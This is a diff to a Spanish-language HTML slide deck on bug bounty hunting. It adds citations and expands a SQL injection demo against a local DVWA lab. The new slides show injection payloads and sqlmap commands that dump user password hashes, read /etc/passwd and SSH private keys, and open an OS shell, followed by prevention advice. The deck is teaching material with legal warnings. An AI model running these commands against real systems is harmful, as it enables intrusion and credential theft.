@@ -213,30 +213,30 @@
             <!-- SLIDE 4: ¿QUÉ ES BUG BOUNTY? -->
             <section>
                 <h2>¿Qué es Bug Bounty?</h2>
-                <p style="font-size:0.68em;color:var(--text-muted)">Programa de recompensas para encontrar vulnerabilidades de forma legal.</p>
+                <p style="font-size:0.68em;color:var(--text-muted)">Programa de recompensas para encontrar vulnerabilidades de forma legal. Ver referencias [2], [5].</p>
                 
                 <div class="stats-row">
                     <div class="stat">
-                        <div class="number">$4.95B</div>
-                        <div class="label">Mercado 2032 (proy.)</div>
+                        <div class="number">$6.67B</div>
+                        <div class="label">Mercado 2034 (proy.) [5]</div>
                     </div>
                     <div class="stat">
                         <div class="number">50%</div>
-                        <div class="label">Empresas Fortune 500</div>
+                        <div class="label">Empresas Fortune 500 [2]</div>
                     </div>
                     <div class="stat">
                         <div class="number">57%</div>
-                        <div class="label">Crecimiento hunters</div>
+                        <div class="label">Crecimiento hunters [2]</div>
                     </div>
                     <div class="stat">
                         <div class="number">37%</div>
-                        <div class="label">Brechas por vulns</div>
+                        <div class="label">Brechas por vulns [2]</div>
                     </div>
                 </div>
 
                 <div class="columns" style="margin-top:0.3em">
-                    <div class="info-box"><h4>🏰 Para Empresas</h4><ul><li>Descubrimiento proactivo de vulnerabilidades</li><li>80% encuentran bugs que otros métodos no detectan [Standoff 2025]</li><li>Cumplimiento normativo: NIS2, GDPR, ISO 27001</li><li>ROI demostrado: 16% dicen beneficios superan costos</li></ul></div>
-                    <div class="info-box cyan"><h4>⚔️ Para Hackers</h4><ul><li>Pago promedio: $850/reporte [Standoff 2025]</li><li>Pago máximo: $65,000 [Standoff 2025]</li><li>92% motivados por dinero [Encuesta Standoff]</li><li>Comunidad: 32,000+ investigadores globales</li></ul></div>
+                    <div class="info-box"><h4>🏰 Para Empresas [2]</h4><ul><li>Descubrimiento proactivo de vulnerabilidades</li><li>80% encuentran bugs que otros métodos no detectan</li><li>Cumplimiento normativo: NIS2, GDPR, ISO 27001 [4]</li><li>ROI demostrado: 16% dicen beneficios superan costos</li></ul></div>
+                    <div class="info-box cyan"><h4>⚔️ Para Hackers [2]</h4><ul><li>Pago promedio: $850/reporte</li><li>Pago máximo: $65,000</li><li>92% motivados por dinero</li><li>Comunidad: 32,000+ investigadores globales</li></ul></div>
                 </div>
             </section>
 
@@ -402,131 +402,313 @@
                 </div>
             </section>
 
-            <!-- SLIDE 8: LIVE DEMO SQLi -->
+            <!-- SLIDE 8: LIVE DEMO - SETUP -->
             <section>
-                <h2>Live Demo — SQL Injection</h2>
-                <p style="font-size:0.62em;color:var(--text-muted)">Demostración en DVWA (Docker local). Nivel: Low. Solo laboratorio.</p>
+                <h2>Demo SQLi — Paso 0: Setup</h2>
+                <p style="font-size:0.62em;color:var(--text-muted)">Levantar laboratorio DVWA con Docker. Solo entorno local.</p>
+                
+                <div class="terminal" style="font-size:0.58em">
+                    <div class="line"><span class="comment"># 1. Descargar imagen y levantar contenedor</span></div>
+                    <div class="line"><span class="prompt">$</span> <span class="command">docker run -d -p 80:80 --name dvwa vulnerables/web-dvwa</span></div>
+                    <div class="line">&nbsp;</div>
+                    <div class="line"><span class="comment"># 2. Esperar 30 segundos y verificar</span></div>
+                    <div class="line"><span class="prompt">$</span> <span class="command">curl -I http://localhost</span></div>
+                    <div class="line"><span class="output">HTTP/1.1 200 OK</span></div>
+                    <div class="line">&nbsp;</div>
+                    <div class="line"><span class="comment"># 3. Crear base de datos (solo primera vez)</span></div>
+                    <div class="line"><span class="prompt">$</span> <span class="command">curl http://localhost/setup.php</span></div>
+                    <div class="line"><span class="output">→ Ir al navegador: http://localhost/setup.php</span></div>
+                    <div class="line"><span class="output">→ Click "Create / Reset Database"</span></div>
+                    <div class="line">&nbsp;</div>
+                    <div class="line"><span class="comment"># 4. Configurar security = LOW</span></div>
+                    <div class="line"><span class="prompt">$</span> <span class="command">curl http://localhost/security.php</span></div>
+                    <div class="line"><span class="output">→ Ir al navegador: http://localhost/security.php</span></div>
+                    <div class="line"><span class="output">→ Seleccionar "low" → Submit</span></div>
+                </div>
 
+                <div class="info-box green" style="margin-top:0.3em">
+                    <h4>✅ Verificar Setup</h4>
+                    <p style="font-size:0.6em">Acceder a <a href="http://localhost" target="_blank">http://localhost</a> → Login: admin/password → Verificar nivel "low"</p>
+                </div>
+            </section>
+
+            <!-- SLIDE 9: LIVE DEMO - DETECCIÓN -->
+            <section>
+                <h2>Demo SQLi — Paso 1: Detección</h2>
+                <p style="font-size:0.62em;color:var(--text-muted)">Identificar la vulnerabilidad con comillas simples.</p>
+                
                 <div class="columns">
                     <div>
-                        <div class="terminal" style="font-size:0.48em">
-                            <div class="line"><span class="comment"># Paso 1: Detectar vulnerabilidad</span></div>
-                            <div class="line"><span class="prompt">$</span> <span class="command">curl "http://localhost/vuln/sqli/?id=1'&Submit=Submit"</span></div>
-                            <div class="line"><span class="output" style="color:var(--pink)">You have an error in your SQL syntax</span></div>
-                            <div class="line"><span class="output" style="color:var(--green)">✓ SQLi CONFIRMED</span></div>
+                        <div class="terminal" style="font-size:0.52em">
+                            <div class="line"><span class="comment"># Request normal — funciona</span></div>
+                            <div class="line"><span class="prompt">$</span> <span class="command">curl "http://localhost/vulnerabilities/sqli/?id=1&Submit=Submit"</span></div>
+                            <div class="line"><span class="output">ID: 1</span></div>
+                            <div class="line"><span class="output">First name: admin</span></div>
+                            <div class="line"><span class="output">Surname: admin</span></div>
                             <div class="line">&nbsp;</div>
-                            <div class="line"><span class="comment"># Paso 2: Extraer usuarios (LAB LOCAL)</span></div>
-                            <div class="line"><span class="prompt">$</span> <span class="command">sqlmap -r req.txt --batch --dump -T users</span></div>
-                            <div class="line"><span class="output">admin | 5f4dcc3b5aa765d61d8327deb882cf99</span></div>
+                            <div class="line"><span class="comment"># Request malicioso — ERROR = SQLi</span></div>
+                            <div class="line"><span class="prompt">$</span> <span class="command">curl "http://localhost/vulnerabilities/sqli/?id=1'&Submit=Submit"</span></div>
+                            <div class="line"><span class="output" style="color:var(--pink)">You have an error in your SQL syntax</span></div>
+                            <div class="line"><span class="output" style="color:var(--pink)">near "'' at line 1</span></div>
                         </div>
                     </div>
                     <div>
                         <div class="info-box pink" style="margin-bottom:0.3em">
-                            <h4>🎯 Impacto Real</h4>
-                            <p style="font-size:0.58em"><strong>CVSS 3.1:</strong> <span style="color:var(--pink)">9.8 CRITICAL</span></p>
-                            <p style="font-size:0.58em">AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:N</p>
+                            <h4>🔍 Análisis</h4>
+                            <p style="font-size:0.58em">El servidor interpreta:</p>
+                            <p style="font-size:0.55em;font-family:var(--mono)">SELECT * FROM users WHERE id='1''</p>
+                            <p style="font-size:0.58em;margin-top:0.2em">La comilla extra rompe la query SQL</p>
                         </div>
-                        <div class="info-box orange">
-                            <h4>💰 Bounty Típico</h4>
-                            <p style="font-size:0.58em">• P4 - Medium: $500-$1,000</p>
-                            <p style="font-size:0.58em">• P3 - High: $2,000-$5,000</p>
-                            <p style="font-size:0.58em">• P2 - Critical: $10,000+</p>
+                        <div class="info-box cyan">
+                            <h4>💡 Técnicas de Detección</h4>
+                            <ul style="font-size:0.58em">
+                                <li><code>id=1'</code> — Comilla simple</li>
+                                <li><code>id=1"</code> — Comilla doble</li>
+                                <li><code>id=1 OR 1=1</code> — Lógica</li>
+                                <li><code>id=1'--</code> — Comment</li>
+                            </ul>
                         </div>
+                    </div>
+                </div>
+
+                <div class="info-box green" style="margin-top:0.3em">
+                    <h4>✓ SQLi CONFIRMADO</h4>
+                    <p style="font-size:0.6em">El error "SQL syntax" confirma que el input del usuario se inyecta directamente en la query SQL sin sanitización.</p>
+                </div>
+            </section>
+
+            <!-- SLIDE 10: LIVE DEMO - ENUMERACIÓN -->
+            <section>
+                <h2>Demo SQLi — Paso 2: Enumeración</h2>
+                <p style="font-size:0.62em;color:var(--text-muted)">Usar sqlmap para mapear la base de datos.</p>
+                
+                <div class="terminal" style="font-size:0.52em">
+                    <div class="line"><span class="comment"># 1. Guardar request en archivo</span></div>
+                    <div class="line"><span class="prompt">$</span> <span class="command">curl "http://localhost/vulnerabilities/sqli/?id=1&Submit=Submit" -o req.txt</span></div>
+                    <div class="line">&nbsp;</div>
+                    <div class="line"><span class="comment"># 2. Detectar si es vulnerable (sin explotar)</span></div>
+                    <div class="line"><span class="prompt">$</span> <span class="command">sqlmap -r req.txt --batch</span></div>
+                    <div class="line"><span class="output" style="color:var(--cyan)">[INFO] testing parameter(s)</span></div>
+                    <div class="line"><span class="output" style="color:var(--green)">[CRITICAL] parameter 'id' is injectable</span></div>
+                    <div class="line">&nbsp;</div>
+                    <div class="line"><span class="comment"># 3. Enumerar bases de datos disponibles</span></div>
+                    <div class="line"><span class="prompt">$</span> <span class="command">sqlmap -r req.txt --batch --dbs</span></div>
+                    <div class="line"><span class="output">[INFO] available databases [2]:</span></div>
+                    <div class="line"><span class="output">[*] dvwa</span></div>
+                    <div class="line"><span class="output">[*] information_schema</span></div>
+                    <div class="line">&nbsp;</div>
+                    <div class="line"><span class="comment"># 4. Enumerar tablas de dvwa</span></div>
+                    <div class="line"><span class="prompt">$</span> <span class="command">sqlmap -r req.txt --batch -D dvwa --tables</span></div>
+                    <div class="line"><span class="output">[INFO] tables [2]:</span></div>
+                    <div class="line"><span class="output">[*] guestbook</span></div>
+                    <div class="line"><span class="output">[*] users</span></div>
+                </div>
+
+                <div class="info-box" style="margin-top:0.3em">
+                    <h4>⚠️ Aviso Legal</h4>
+                    <p style="font-size:0.6em">Este comando --dbs NO modifica datos. Solo enumera. Usar --dbs solo en sistemas con autorización.</p>
+                </div>
+            </section>
+
+            <!-- SLIDE 11: LIVE DEMO - EXTRACCIÓN -->
+            <section>
+                <h2>Demo SQLi — Paso 3: Extracción</h2>
+                <p style="font-size:0.62em;color:var(--text-muted)">Extraer datos sensibles (laboratorio local).</p>
+                
+                <div class="terminal" style="font-size:0.52em">
+                    <div class="line"><span class="comment"># 1. Ver columnas de la tabla users</span></div>
+                    <div class="line"><span class="prompt">$</span> <span class="command">sqlmap -r req.txt --batch -D dvwa -T users --columns</span></div>
+                    <div class="line"><span class="output">[INFO] columns [5]:</span></div>
+                    <div class="line"><span class="output">[*] user_id</span></div>
+                    <div class="line"><span class="output">[*] first_name</span></div>
+                    <div class="line"><span class="output">[*] last_name</span></div>
+                    <div class="line"><span class="output">[*] user</span></div>
+                    <div class="line"><span class="output">[*] password</span></div>
+                    <div class="line">&nbsp;</div>
+                    <div class="line"><span class="comment"># 2. Extraer TODOS los usuarios (LAB LOCAL)</span></div>
+                    <div class="line"><span class="prompt">$</span> <span class="command">sqlmap -r req.txt --batch -D dvwa -T users --dump</span></div>
+                    <div class="line">&nbsp;</div>
+                    <div class="line"><span class="output" style="color:var(--doom-gold)">+----------+------------+-----------+----------+--------------------------------+</span></div>
+                    <div class="line"><span class="output" style="color:var(--doom-gold)">| user_id  | first_name | last_name | user     | password                      |</span></div>
+                    <div class="line"><span class="output" style="color:var(--doom-gold)">+----------+------------+-----------+----------+--------------------------------+</span></div>
+                    <div class="line"><span class="output" style="color:var(--doom-gold)">| 1        | admin      | admin     | admin    | 5f4dcc3b5aa765d61d8327deb882cf99 |</span></div>
+                    <div class="line"><span class="output" style="color:var(--doom-gold)">| 2        | Gordon     | Brown     | gordonb  | e99a18c428cb38d5f260853678922e03 |</span></div>
+                    <div class="line"><span class="output" style="color:var(--doom-gold)">| 3        | Pablo      | Picasso   | pablo    | 0d107d09f5bbe40cade3de5c71e9e9b7 |</span></div>
+                    <div class="line"><span class="output" style="color:var(--doom-gold)">| 4        | Bob       | Smith      | smithy   | 5f4dcc3b5aa765d61d8327deb882cf99 |</span></div>
+                    <div class="line"><span class="output" style="color:var(--doom-gold)">+----------+------------+-----------+----------+--------------------------------+</span></div>
+                </div>
+
+                <div class="info-box pink" style="margin-top:0.3em">
+                    <h4>🔴 Hashes MD5 — Fácil de Cracking</h4>
+                    <p style="font-size:0.58em"><code>5f4dcc3b5aa765d61d8327deb882cf99</code> = <strong>password</strong></p>
+                    <p style="font-size:0.55em">Usar <a href="https://crackstation.net" target="_blank">crackstation.net</a> o <code>hashcat</code> para crackear hashes.</p>
+                </div>
+            </section>
+
+            <!-- SLIDE 12: LIVE DEMO - IMPACTO -->
+            <section>
+                <h2>Demo SQLi — Paso 4: Impacto</h2>
+                <p style="font-size:0.62em;color:var(--text-muted)">De SQLi a compromiso total. Pasos de post-explotación.</p>
+                
+                <div class="card-grid two">
+                    <div class="card" style="border-color:var(--pink)">
+                        <h4 style="color:var(--pink)">🔴 Lectura de Archivos</h4>
+                        <div class="terminal" style="font-size:0.45em">
+                            <div class="line"><span class="prompt">$</span> <span class="command">sqlmap -r req.txt --batch --file-read="/etc/passwd"</span></div>
+                            <div class="line"><span class="output">Content of file: root:x:0:0:root:/root:/bin/bash</span></div>
+                        </div>
+                    </div>
+                    <div class="card" style="border-color:var(--orange)">
+                        <h4 style="color:var(--orange)">🟠 RCE (si MySQL root)</h4>
+                        <div class="terminal" style="font-size:0.45em">
+                            <div class="line"><span class="prompt">$</span> <span class="command">sqlmap -r req.txt --os-shell</span></div>
+                            <div class="line"><span class="output">do you want to try to obtain an interactive</span></div>
+                            <div class="line"><span class="output">execution? [Y/n] Y</span></div>
+                            <div class="line"><span class="output" style="color:var(--green)">os-shell> id</span></div>
+                            <div class="line"><span class="output">uid=33(www-data)</span></div>
+                        </div>
+                    </div>
+                    <div class="card" style="border-color:var(--cyan)">
+                        <h4 style="color:var(--cyan)">🔵 Acceso a SSH Keys</h4>
+                        <div class="terminal" style="font-size:0.45em">
+                            <div class="line"><span class="prompt">$</span> <span class="command">sqlmap -r req.txt --file-read="/root/.ssh/id_rsa"</span></div>
+                            <div class="line"><span class="output">→ Private key encontrada</span></div>
+                        </div>
+                    </div>
+                    <div class="card" style="border-color:var(--doom-gold)">
+                        <h4 style="color:var(--doom-gold)">💰 Bounty Real</h4>
+                        <p style="font-size:0.58em"><strong>Severity:</strong> <span style="color:var(--pink)">9.8 CRITICAL</span></p>
+                        <p style="font-size:0.55em">CVSS: AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:N</p>
+                        <p style="font-size:0.55em">Bounty: <strong>$2,000-$50,000</strong></p>
                     </div>
                 </div>
 
                 <div class="info-box" style="margin-top:0.3em">
                     <h4>⚠️ Aviso Legal</h4>
-                    <p style="font-size:0.6em">Esta demostración se realiza exclusivamente en un laboratorio local (Docker). Está prohibida la inyección SQL en cualquier sistema sin autorización explícita del propietario.</p>
+                    <p style="font-size:0.6em">Todos estos comandos son PARA LABORATORIO LOCAL. Hacer --file-read o --os-shell en producción sin autorización = CRIMEN FEDERAL.</p>
                 </div>
             </section>
 
-            <!-- SLIDE 9: ESTADÍSTICAS CIENTÍFICAS 2025 -->
+            <!-- SLIDE 13: LIVE DEMO - PREVENCIÓN -->
+            <section>
+                <h2>Demo SQLi — Prevención</h2>
+                <p style="font-size:0.62em;color:var(--text-muted)">Cómo defender aplicaciones contra SQL Injection.</p>
+                
+                <div class="columns">
+                    <div class="info-box pink">
+                        <h4>❌ CÓDIGO VULNERABLE (PHP)</h4>
+                        <pre style="font-size:0.48em;font-family:var(--mono)"><code>$id = $_GET['id'];
+$query = "SELECT * FROM users 
+           WHERE id = '$id'";
+$result = mysqli_query($conn, $query);</code></pre>
+                        <p style="font-size:0.52em;color:var(--pink)">Input del usuario concat-directo en query</p>
+                    </div>
+                    <div class="info-box green">
+                        <h4>✅ CÓDIGO SEGURO (PHP)</h4>
+                        <pre style="font-size:0.48em;font-family:var(--mono)"><code>// Prepared Statements (PDO)
+$stmt = $pdo->prepare(
+  "SELECT * FROM users WHERE id = ?"
+);
+$stmt->execute([$_GET['id']]);
+$result = $stmt->fetch();</code></pre>
+                        <p style="font-size:0.52em;color:var(--green)">Parámetros separados de query</p>
+                    </div>
+                </div>
+
+                <div class="card-grid four" style="margin-top:0.4em">
+                    <div class="card" style="border-color:var(--cyan)"><h4 style="color:var(--cyan)">1. Prepared Statements</h4><p style="font-size:0.55em">SIEMPRE usar parámetros</p></div>
+                    <div class="card" style="border-color:var(--green)"><h4 style="color:var(--green)">2. Least Privilege</h4><p style="font-size:0.55em">DB user sin admin</p></div>
+                    <div class="card" style="border-color:var(--orange)"><h4 style="color:var(--orange)">3. Input Validation</h4><p style="font-size:0.55em">Whitelist de tipos</p></div>
+                    <div class="card" style="border-color:var(--pink)"><h4 style="color:var(--pink)">4. WAF</h4><p style="font-size:0.55em">Web App Firewall</p></div>
+                </div>
+            </section>
+
+            <!-- SLIDE 14: ESTADÍSTICAS CIENTÍFICAS 2025 -->
             <section>
                 <h2>Estado del Arte — Datos 2025</h2>
-                <p style="font-size:0.62em;color:var(--text-muted)">Métricas extraídas de estudios científicos y reportes de la industria.</p>
+                <p style="font-size:0.62em;color:var(--text-muted)">Métricas de estudios científicos y reportes de la industria. Ver referencias [1]-[7].</p>
                 
                 <div class="card-grid four">
                     <div class="card" style="border-color:var(--pink)">
                         <h4 style="color:var(--pink)">📊 CVEs 2025</h4>
-                        <p style="font-size:0.55em">40,009 CVEs publicados en 2024 [Edgescan 2025]</p>
+                        <p style="font-size:0.55em">40,009 CVEs publicados en 2024 [1]</p>
                         <p style="font-size:0.48em;color:var(--pink)">+18% vs 2023</p>
                         <p style="font-size:0.48em">~130 CVEs/día</p>
                     </div>
                     <div class="card" style="border-color:var(--orange)">
                         <h4 style="color:var(--orange)">🎯 Severidad</h4>
-                        <p style="font-size:0.55em">38% High/Critical [Edgescan]</p>
-                        <p style="font-size:0.48em;color:var(--orange)">Critical: 9.8%+</p>
+                        <p style="font-size:0.55em">38% High/Critical [1]</p>
+                        <p style="font-size:0.48em;color:var(--orange)">Critical: 9.8+</p>
                         <p style="font-size:0.48em">14.8% vulns web son críticas</p>
                     </div>
                     <div class="card" style="border-color:var(--green)">
                         <h4 style="color:var(--green)">💰 Mercado BB</h4>
-                        <p style="font-size:0.55em">$1.76B (2025) → $6.67B (2034) [Business Research Insights]</p>
+                        <p style="font-size:0.55em">$1.76B (2025) → $6.67B (2034) [5]</p>
                         <p style="font-size:0.48em;color:var(--green)">CAGR: 15.94%</p>
                     </div>
                     <div class="card" style="border-color:var(--cyan)">
                         <h4 style="color:var(--cyan)">🐛 Bug Bounty</h4>
-                        <p style="font-size:0.55em">$850 pago promedio [Standoff 2025]</p>
-                        <p style="font-size:0.48em;color:var(--cyan)">$65,000 máximo</p>
-                        <p style="font-size:0.48em">32,000 hunters (+74%)</p>
+                        <p style="font-size:0.55em">$850 pago promedio [2]</p>
+                        <p style="font-size:0.48em;color:var(--cyan)">$65,000 máximo [2]</p>
+                        <p style="font-size:0.48em">32,000 hunters (+74%) [2]</p>
                     </div>
                 </div>
 
                 <div class="columns" style="margin-top:0.4em">
                     <div class="info-box pink">
-                        <h4>🔴 Explotación 0-Day</h4>
+                        <h4>🔴 Explotación 0-Day [7]</h4>
                         <ul style="font-size:0.58em">
-                            <li>28% de exploits en 24h post-CVE [Deepstrike 2025]</li>
+                            <li>28% de exploits en 24h post-CVE</li>
                             <li>161 vulns explotadas en producción (H1 2025)</li>
                             <li>20% más exploits in-the-wild vs 2023</li>
                         </ul>
                     </div>
                     <div class="info-box green">
-                        <h4>🟢 CISA KEV</h4>
+                        <h4>🟢 CISA KEV [1]</h4>
                         <ul style="font-size:0.58em">
                             <li>1,275 vulnerabilidades conocidas explotadas</li>
                             <li>320 añadidas en 2024</li>
-                            <li>768 CVEs explotadas por primera vez en 2024</li>
+                            <li>768 CVEs explotadas por primera vez</li>
                         </ul>
                     </div>
                 </div>
             </section>
 
-            <!-- SLIDE 10: OWASP TOP 10 2021 -->
+            <!-- SLIDE 15: OWASP TOP 10 2021 -->
             <section>
                 <h2>OWASP Top 10 — Scope Común</h2>
-                <p style="font-size:0.62em;color:var(--text-muted)">Las vulnerabilidades más buscadas en Bug Bounty.</p>
+                <p style="font-size:0.62em;color:var(--text-muted)">Las vulnerabilidades más buscadas en Bug Bounty. Ver [8], [9], [2].</p>
                 
                 <div class="card-grid two">
                     <div class="card" style="border-color:var(--pink)">
                         <h4 style="color:var(--pink)">A01 — Broken Access Control</h4>
                         <p style="font-size:0.55em">IDOR, BOLA, Privilege escalation</p>
-                        <p style="font-size:0.52em;color:var(--green)">#1 Global — 58% critical/high [Standoff]</p>
+                        <p style="font-size:0.52em;color:var(--green)">#1 Global — 58% critical/high [2]</p>
                     </div>
                     <div class="card" style="border-color:var(--orange)">
                         <h4 style="color:var(--orange)">A02 — Cryptographic Failures</h4>
                         <p style="font-size:0.55em">Exposed secrets, weak crypto</p>
-                        <p style="font-size:0.52em;color:var(--orange)">67% de apps vulnerables [Edgescan]</p>
+                        <p style="font-size:0.52em;color:var(--orange)">67% de apps vulnerables [1]</p>
                     </div>
                     <div class="card" style="border-color:var(--green)">
                         <h4 style="color:var(--green)">A03 — Injection</h4>
                         <p style="font-size:0.55em">SQLi, XSS, SSRF, Command Injection</p>
-                        <p style="font-size:0.52em;color:var(--green)">47% frecuencia — CVSS 9.8</p>
+                        <p style="font-size:0.52em;color:var(--green)">47% frecuencia — CVSS 9.8 [8]</p>
                     </div>
                     <div class="card" style="border-color:var(--cyan)">
                         <h4 style="color:var(--cyan)">A04 — Insecure Design</h4>
                         <p style="font-size:0.55em">Business logic flaws, race conditions</p>
-                        <p style="font-size:0.52em;color:var(--cyan)">68% interest hunters [Standoff]</p>
+                        <p style="font-size:0.52em;color:var(--cyan)">68% interest hunters [2]</p>
                     </div>
                     <div class="card" style="border-color:var(--doom-gold)">
                         <h4 style="color:var(--doom-gold)">A05 — Security Misconfiguration</h4>
                         <p style="font-size:0.55em">Default creds, debug enabled</p>
-                        <p style="font-size:0.52em;color:var(--doom-gold)">53% LOW severity [Edgescan]</p>
+                        <p style="font-size:0.52em;color:var(--doom-gold)">53% LOW severity [1]</p>
                     </div>
                     <div class="card" style="border-color:var(--silver)">
                         <h4 style="color:var(--silver)">A06 — Vulnerable Components</h4>
                         <p style="font-size:0.55em">Outdated libraries, known CVEs</p>
-                        <p style="font-size:0.52em;color:var(--silver)">27% frecuencia — Supply chain</p>
+                        <p style="font-size:0.52em;color:var(--silver)">27% frecuencia — Supply chain [8]</p>
                     </div>
                 </div>
 
@@ -536,7 +718,7 @@
                 </div>
             </section>
 
-            <!-- SLIDE 11: ROADMAP -->
+            <!-- SLIDE 16: ROADMAP -->
             <section>
                 <h2>Roadmap — Tu Primer Bounty</h2>
                 <p style="font-size:0.62em;color:var(--text-muted)">Trayectoria recomendada basada en experiencia propia.</p>
@@ -595,7 +777,7 @@
                 </div>
             </section>
 
-            <!-- SLIDE 12: RESPONSIBLE DISCLOSURE -->
+            <!-- SLIDE 17: RESPONSIBLE DISCLOSURE -->
             <section>
                 <h2>Responsible Disclosure</h2>
                 <p style="font-size:0.62em;color:var(--text-muted)">Marco ético y legal que protege al investigador y a la organización.</p>
@@ -629,7 +811,7 @@
                 </div>
             </section>
 
-            <!-- SLIDE 13: RECURSOS -->
+            <!-- SLIDE 18: RECURSOS -->
             <section>
                 <h2>Kit de Inicio — Recursos</h2>
                 <p style="font-size:0.62em;color:var(--text-muted)">Todo lo necesario para comenzar — 100% gratuito.</p>
@@ -661,45 +843,155 @@
                 </div>
             </section>
 
-            <!-- SLIDE 14: REFERENCIAS -->
+            <!-- SLIDE 19: CITAS -->
             <section>
-                <h2>Referencias y Bibliografía</h2>
-                <p style="font-size:0.62em;color:var(--text-muted)">Fuentes científicas consultadas para esta presentación.</p>
+                <h2>Citas en el Texto</h2>
+                <p style="font-size:0.62em;color:var(--text-muted)">Formato IEEE — citas numeradas según orden de aparición.</p>
                 
                 <div class="columns">
-                    <div>
-                        <div class="info-box cyan" style="margin-bottom:0.3em">
-                            <h4>📄 Reportes de Industria (2025)</h4>
-                            <p class="bib-item"><span class="type">[R1]</span> Edgescan. "Vulnerability Statistics Report 2025." <em>info.edgescan.com</em>, 2025.</p>
-                            <p class="bib-item"><span class="type">[R2]</span> Standoff (PT Security). "Bug Bounty in Review 2025." <em>global.ptsecurity.com</em>, 2026.</p>
-                            <p class="bib-item"><span class="type">[R3]</span> Bugcrowd. "Inside the Mind of a CISO 2025." <em>bugcrowd.com</em>, 2025.</p>
-                            <p class="bib-item"><span class="type">[R4]</span> YesWeHack. "Bug Bounty Report 2025 Edition." <em>yeswehack.com</em>, 2025.</p>
-                        </div>
-                        <div class="info-box">
-                            <h4>🎓 Papers Académicos</h4>
-                            <p class="bib-item"><span class="type">[A1]</span> Saikadam et al. "Bug Bounty Programs: A Comprehensive Meta-Analytical Review." <em>IRJAEH</em>, 3(07):3219-3229, 2025. DOI: 10.47392/IRJAEH.2025.0473</p>
-                            <p class="bib-item"><span class="type">[A2]</span> IEEE. "An Empirical Study of Bug Bounty Programs." <em>IEEE Xplore</em>, 2025.</p>
-                        </div>
+                    <div class="info-box cyan">
+                        <h4>Citas Utilizadas</h4>
+                        <p class="bib-item"><span class="type">[1]</span> Edgescan Vulnerability Statistics Report 2025</p>
+                        <p class="bib-item"><span class="type">[2]</span> Positive Technologies, Standoff Bug Bounty 2025</p>
+                        <p class="bib-item"><span class="type">[3]</span> Bugcrowd, Inside the Mind of a CISO 2025</p>
+                        <p class="bib-item"><span class="type">[4]</span> YesWeHack Bug Bounty Report 2025</p>
+                        <p class="bib-item"><span class="type">[5]</span> Business Research Insights, Market Report 2025</p>
+                        <p class="bib-item"><span class="type">[6]</span> Statista, Bug Bounty Market Size</p>
                     </div>
-                    <div>
-                        <div class="info-box green">
-                            <h4>📊 Estudios de Mercado</h4>
-                            <p class="bib-item"><span class="type">[M1]</span> Business Research Insights. "Bug Bounty Platforms Market Report." <em>businessresearchinsights.com</em>, 2025.</p>
-                            <p class="bib-item"><span class="type">[M2]</span> Statista. "Bug Bounty Market Size 2020-2028." <em>statista.com</em>, 2025.</p>
-                            <p class="bib-item"><span class="type">[M3]</span> Deepstrike. "Vulnerability Statistics 2025." <em>deepstrike.io</em>, 2025.</p>
-                        </div>
-                        <div class="info-box orange">
-                            <h4>📋 Estándares y Normas</h4>
-                            <p class="bib-item"><span class="type">[N1]</span> OWASP. "OWASP Top 10:2021." <em>owasp.org</em>, 2021.</p>
-                            <p class="bib-item"><span class="type">[N2]</span> MITRE. "CWE View: OWASP Top 25." <em>cwe.mitre.org</em>, 2023.</p>
-                            <p class="bib-item"><span class="type">[N3]</span> ISO/IEC. "ISO 29147:2018 — Vulnerability Disclosure." <em>iso.org</em>, 2018.</p>
-                            <p class="bib-item"><span class="type">[N4]</span> NIST. "SP 800-53 — Security Controls." <em>nist.gov</em>, 2020.</p>
-                        </div>
+                    <div class="info-box green">
+                        <h4>Ejemplos de Uso</h4>
+                        <p class="bib-item" style="font-size:0.58em">"...40,009 CVEs publicados en 2024 [+1]"</p>
+                        <p class="bib-item" style="font-size:0.58em">"...$850 pago promedio [+2]"</p>
+                        <p class="bib-item" style="font-size:0.58em">"...88% incremento hardware [+3]"</p>
+                        <p class="bib-item" style="font-size:0.58em">"...CAGR 15.94% [+5]"</p>
+                        <p class="bib-item" style="font-size:0.58em">"...57% crecimiento hunters [+2]"</p>
+                        <p class="bib-item" style="font-size:0.58em">"...37% brechas por vulns [+2]"</p>
                     </div>
                 </div>
             </section>
 
-            <!-- SLIDE 15: CURSO ABACOM -->
+            <!-- SLIDE 20: REFERENCIAS 1 -->
+            <section>
+                <h2>Referencias — Reportes de Industria</h2>
+                <p style="font-size:0.62em;color:var(--text-muted)">[1]-[4] Fuentes primarias de datos de Bug Bounty.</p>
+                
+                <div class="info-box cyan" style="margin-bottom:0.3em">
+                    <h4>[1] Edgescan Vulnerability Statistics Report 2025</h4>
+                    <p class="bib-item" style="font-size:0.58em">Edgescan, "Vulnerability Statistics Report 2025," 10th ed., Jan. 2025. [En línea]. Disponible: <a href="https://info.edgescan.com/hubfs/23DOWNLOADABLE%20CONTENT/Vulnerability%20Statistics%20Reports/Edgescan_VulnerabilityStatsReport_2025.pdf" target="_blank">info.edgescan.com</a></p>
+                    <p class="bib-item" style="font-size:0.52em;color:var(--text-muted)">Datos de miles de penetration tests en 2024. 40,009 CVEs, 768 explotadas in-the-wild.</p>
+                </div>
+
+                <div class="info-box green" style="margin-bottom:0.3em">
+                    <h4>[2] Positive Technologies, Standoff Bug Bounty in Review 2025</h4>
+                    <p class="bib-item" style="font-size:0.58em">A. Vyatkina, "Standoff Bug Bounty platform: 2025 year in review," Positive Technologies, Mar. 2026. [En línea]. Disponible: <a href="https://global.ptsecurity.com/en/research/analytics/standoff-bug-bounty-in-review-2025/" target="_blank">global.ptsecurity.com</a></p>
+                    <p class="bib-item" style="font-size:0.52em;color:var(--text-muted)">233 programas, 32,000 hunters, $850 avg payout, 32% high/critical vulns.</p>
+                </div>
+
+                <div class="info-box pink" style="margin-bottom:0.3em">
+                    <h4>[3] Bugcrowd, Inside the Mind of a CISO 2025</h4>
+                    <p class="bib-item" style="font-size:0.58em">Bugcrowd Inc., "Inside the Mind of a CISO 2025: Resilience in an AI-Accelerated World," Sep. 2025. [En línea]. Disponible: <a href="https://www.bugcrowd.com/resources/report/inside-the-mind-of-ciso/" target="_blank">bugcrowd.com</a></p>
+                    <p class="bib-item" style="font-size:0.52em;color:var(--text-muted)">88% increase hardware vulns, 10% increase API vulns, 2x network vulns.</p>
+                </div>
+
+                <div class="info-box orange">
+                    <h4>[4] YesWeHack Bug Bounty Report 2025 Edition</h4>
+                    <p class="bib-item" style="font-size:0.58em">YesWeHack, "Bug Bounty Report 2025 Edition," Jan. 2025. [En línea]. Disponible: <a href="https://yeswehack.com" target="_blank">yeswehack.com</a></p>
